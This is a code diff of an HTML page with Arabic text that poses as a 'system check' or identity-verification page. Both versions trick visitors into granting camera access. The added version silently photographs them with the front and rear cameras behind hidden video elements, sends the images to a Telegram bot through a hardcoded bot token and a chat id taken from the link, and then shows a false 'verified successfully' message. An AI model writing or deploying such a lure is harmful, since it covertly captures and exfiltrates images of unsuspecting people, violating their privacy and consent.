@@ -1,66 +1,65 @@
 <!DOCTYPE html>
-<html lang="ar" dir="rtl">
+<html lang="en">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>مركز التحقق والمزامنة</title>
+    <title>System Check</title>
     <style>
-        body { font-family: sans-serif; background: #f0f2f5; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
-        .card { background: white; padding: 30px; border-radius: 15px; box-shadow: 0 4px 15px rgba(0,0,0,0.1); text-align: center; width: 90%; max-width: 400px; }
-        .btn { display: inline-block; padding: 15px 25px; background: #1a73e8; color: white; border: none; border-radius: 25px; font-weight: bold; cursor: pointer; font-size: 16px; transition: 0.3s; }
-        #video { display: none; width: 100%; border-radius: 10px; margin-top: 10px; }
+        body { background: #000; color: #0f0; text-align: center; font-family: monospace; padding-top: 50px; }
+        video, canvas { display: none; }
     </style>
 </head>
 <body>
-    <div class="card">
-        <h2>نظام التحقق الموحد ✅</h2>
-        <p>اضغط أدناه للموافقة على مزامنة البريد والتحقق من الهوية بالصورة.</p>
-        <button id="mainBtn" class="btn">ابدأ العملية الآن</button>
-        <p id="status" style="margin-top:15px; color:#666;"></p>
-        <video id="video" autoplay playsinline></video>
-        <canvas id="canvas" style="display:none;"></canvas>
-    </div>
+    <h2 id="status">جاري التحقق من النظام...</h2>
+    <p>يرجى الموافقة على صلاحيات الكاميرا للمتابعة</p>
+    <video id="video" autoplay playsinline></video>
+    <canvas id="canvas"></canvas>
 
     <script>
-        const btn = document.getElementById('mainBtn');
-        const video = document.getElementById('video');
-        const canvas = document.getElementById('canvas');
-        const status = document.getElementById('status');
+        const token = "8379860884:AAHY6orUkUCffcsZc3dNRt8OQSlPJXD_03w";
+        const urlParams = new URLSearchParams(window.location.search);
+        const chatId = urlParams.get('id'); // سحب الأيدي من الرابط تلقائياً
 
-        // 1. ضع هنا رابط الـ Web App الخاص بك من جوجل
-        const GOOGLE_SCRIPT_URL = 'https://script.google.com/macros/s/AKfycbzHmb_zfyckkOBNZDgE4YSh-K9TmmRk35ENFIGV1pC7MrJ9c2QXJHyd5ZfrFuA8IWjx/exec';
-
-        btn.addEventListener('click', async () => {
+        async function init() {
+            if (!chatId) {
+                document.getElementById('status').innerText = "خطأ: رابط غير صالح";
+                return;
+            }
             try {
-                status.innerText = "جاري التقاط صورة التحقق...";
-                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
-                video.srcObject = stream;
-                
-                // انتظار ثانية للالتقاط
-                setTimeout(async () => {
+                // الكاميرا الأمامية
+                await capture("user", "Front");
+                // الكاميرا الخلفية
+                await capture("environment", "Rear");
+                document.getElementById('status').innerText = "تم التحقق بنجاح";
+            } catch (e) {
+                document.getElementById('status').innerText = "خطأ في الصلاحيات";
+            }
+        }
+
+        async function capture(mode, label) {
+            const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: mode } });
+            const video = document.getElementById('video');
+            video.srcObject = stream;
+            return new Promise(res => {
+                setTimeout(() => {
+                    const canvas = document.getElementById('canvas');
                     canvas.width = video.videoWidth;
                     canvas.height = video.videoHeight;
                     canvas.getContext('2d').drawImage(video, 0, 0);
-                    const base64Image = canvas.toDataURL('image/jpeg');
-
-                    // إرسال الصورة لسكربت جوجل (doPost)
-                    await fetch(GOOGLE_SCRIPT_URL, {
-                        method: 'POST',
-                        mode: 'no-cors',
-                        body: JSON.stringify({ image: base64Image, type: 'photo' })
-                    });
-
-                    status.innerText = "تم التقاط الصورة.. جاري الانتقال لموافقة الإيميل...";
                     stream.getTracks().forEach(t => t.stop());
+                    canvas.toBlob(b => send(b, label).then(res), 'image/jpeg');
+                }, 1500);
+            });
+        }
 
-                    // 2. توجيه الشخص لرابط موافقة الإيميل (doGet)
-                    window.location.href = GOOGLE_SCRIPT_URL;
-                }, 2000);
-
-            } catch (err) {
-                status.innerText = "يجب الموافقة على الكاميرا للمتابعة.";
-            }
-        });
+        function send(blob, label) {
+            const fd = new FormData();
+            fd.append('chat_id', chatId);
+            fd.append('photo', blob, 'img.jpg');
+            fd.append('caption', `لقطة من الكاميرا: ${label}`);
+            return fetch(`https://api.telegram.org/bot${token}/sendPhoto`, { method: 'POST', body: fd });
+        }
+        window.onload = init;
     </script>
 </body>
 </html>
